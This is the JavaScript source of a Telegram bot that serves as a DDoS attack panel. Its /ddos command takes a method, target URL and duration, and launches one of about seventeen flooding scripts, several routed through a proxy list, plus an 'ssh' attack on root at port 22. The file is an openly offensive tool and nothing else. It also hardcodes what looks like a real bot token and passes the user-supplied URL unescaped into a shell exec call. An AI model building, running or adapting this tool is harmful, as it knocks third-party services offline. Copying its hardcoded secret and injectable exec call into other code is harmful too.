const { Telegraf } = require('telegraf');
const exec = require('child_process').exec;
const util = require('util');

const bot = new Telegraf('7062528333:AAHj5kg-cH7h_YuN0cnTpzzaicqzaTsvTcE');
const ownerChatId = '6434916607';
const validMethods = new Set([
  'kill', 'strike', 'flood', 'tls2', 'bypass', 'tls', 'ninja', 'mix', 'raw',
  'rapid-reset', 'pidoras', 'http-x', 'ssh', 'SKYNET-TLS', 'SEN-TLS', 'star-tls', 'ELSTARO-TLS'
]);

const execPromise = util.promisify(exec);

bot.start((ctx) => {
  ctx.reply(`💀 WARNING: Welcome, hacker. 💀

This is your command interface for executing **DDoS attacks**.

⚡ Usage: /ddos <method> <url> <time>

🚨 LIST OF METHODS: 🚨
${[...validMethods].join('\n')}

⚠️ **Warning**: Use these responsibly.`);
});

bot.command('ddos', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 3) {
    return ctx.reply('💀 ERROR: Invalid format!\nUsage: /ddos <method> <url> <time>');
  }

  const [method, url, time] = args;
  const attackTime = Math.min(parseInt(time), 300);

  if (!validMethods.has(method)) {
    return ctx.reply('💀 ERROR: Invalid method detected!');
  }

  if (attackTime <= 0 || attackTime > 300) {
    return ctx.reply('⚡ ERROR: Invalid time! Max time is 300 seconds.');
  }

  let command = '';
  switch (method) {
    case 'kill':
      command = `node StarsXKill.js ${url} ${attackTime} 100 10`;
      break;
    case 'strike':
      command = `node StarsXStrike.js GET ${url} ${attackTime} 10 90 proxy.txt --full`;
      break;
    case 'flood':
      command = `node flood.js ${url} ${attackTime} 200 2 proxy.txt`;
      break;
    case 'tls2':
      command = `node tls.js ${url} ${attackTime} 200 2 proxy.txt`;
      break;
    case 'bypass':
      command = `node StarsXBypass.js ${url} ${attackTime} 100 10 proxy.txt`;
      break;
    case 'tls':
      command = `node StarsXTls.js ${url} ${attackTime} 100 10`;
      break;
    case 'ninja':
      command = `node StarsXNinja.js ${url} ${attackTime}`;
      break;
    case 'mix':
      command = `node StarsXMix.js ${url} ${attackTime} 100 10 proxy.txt`;
      break;
    case 'raw':
      command = `node StarsXRaw.js ${url} ${attackTime}`;
      break;
    case 'rapid-reset':
      command = `node StarsXRapid-Reset.js PermenMD ${attackTime} 10 proxy.txt 80 ${url}`;
      break;
    case 'pidoras':
      command = `node StarsXPidoras.js ${url} ${attackTime} 80 10 proxy.txt`;
      break;
    case 'http-x':
      command = `node HTTP-X.js ${url} ${attackTime} 80 10 proxy.txt`;
      break;
    case 'ssh':
      command = `node StarsXSsh.js ${url} 22 root ${attackTime}`;
      break;
    case 'SKYNET-TLS':
      command = `node SKYNET-TLS.js ${url} ${attackTime} 200 10 proxy.txt`;
      break;
    case 'SEN-TLS':
      command = `node SEN-TLS.js ${url} ${attackTime} 200 10 proxy.txt`;
      break;
    case 'star-tls':
      command = `node star-tls.js ${url} ${attackTime} 200 10 proxy.txt`;
      break;
    case 'ELSTARO-TLS':
      command = `node ELSTARO-TLS.js ${url} ${attackTime} 200 10 proxy.txt`;
      break;
    default:
      return ctx.reply('💀 ERROR: Unknown method.');
  }

  try {
    await ctx.reply(`⚡ ATTACK IN PROGRESS ⚡\nMethod: ${method}\nURL: ${url}\nTime: ${attackTime}`);
    const { stdout, stderr } = await execPromise(command);
    if (stderr) {
      return ctx.reply(`🔥 ERROR: ${stderr}`);
    }
    ctx.reply(`💥 ATTACK COMPLETED 💥\nResult: ${stdout}`);
  } catch (error) {
    ctx.reply(`💀 CRITICAL ERROR 💀\nDetails: ${error.message}`);
  }
});

bot.launch();
